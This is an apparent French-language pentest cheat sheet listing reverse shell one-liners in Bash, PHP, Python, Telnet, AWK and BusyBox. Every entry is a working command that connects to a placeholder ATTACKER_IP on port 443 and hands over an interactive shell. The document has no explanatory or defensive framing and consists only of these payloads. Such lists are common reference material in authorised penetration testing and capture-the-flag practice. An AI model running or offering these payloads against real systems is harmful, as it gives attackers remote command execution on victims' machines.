## 🔹 **Bash Reverse Shells**
- **Classique** :  
    bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
- **Read Line** :  
    exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
- **FD 196** :  
    0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
- **FD 5** :  
    bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5

---

## 🔹 **PHP Reverse Shells**
- **exec** :  
    php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
- **shell_exec** :  
    php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
- **system** : 
    php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
- **passthru** :  
    php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
- **popen** :  
    php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3","r");'
    

---

## 🔹 **Python Reverse Shells**

(à lancer avec `python -c` → je mets **PY-C** en raccourci)

- **Avec variables d’env** :  
    export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
    
- **Avec subprocess** :  
    PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
    
- **Version courte** :  
    PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'

---

## 🔹 **Autres**
- **Telnet** :  
```telnet
    TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
```
    
- **AWK** :  
    awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
    
- **BusyBox** :  
    busybox nc ATTACKER_IP 443 -e sh